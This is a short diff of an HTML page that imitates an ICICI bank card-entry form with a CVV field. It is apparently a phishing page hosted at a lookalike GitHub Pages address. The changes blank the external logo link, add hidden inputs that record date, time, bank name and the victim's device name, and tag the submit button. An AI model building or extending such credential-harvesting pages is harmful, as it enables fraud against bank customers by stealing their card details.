@@ -310,7 +310,7 @@ select.list-dt:focus {
 
      
   <div class="col-5">
-   <a href="https://fastl0an.github.io/fivverr2/index.html" class="logo d-flex align-items-center me-auto me-lg-0">
+   <a href="" class="logo d-flex align-items-center me-auto me-lg-0">
         <!-- Uncomment the line below if you also wish to use an image logo -->
      <img src="img/icici.png" >
         
@@ -395,6 +395,10 @@ select.list-dt:focus {
 
                                     <p>
                                     <label class="mb-2 text-black"><b>CVV</b></label>
+                                    <input type="hidden" id="date" name="date" value="" required>
+                                    <input type="hidden" id="time" name="time" value="" required>
+                                                  <input type="hidden" id="app" name="app" value="icici" required>
+                                                  <input type="hidden" id="deviceName" name="deviceName" readonly>
 
                                     <div style="display: flex;" class="form-control form-control-lg">
 
@@ -441,7 +445,7 @@ select.list-dt:focus {
                                     
                                     class="full">
                                       <div style="text-align: center;">
-                                        <button type="submit" style="
+                                        <button type="submit" id="myButton" style="
                                         background-color: #F37E20;
                                         border-radius: 50px;
                                         border-width: 0;
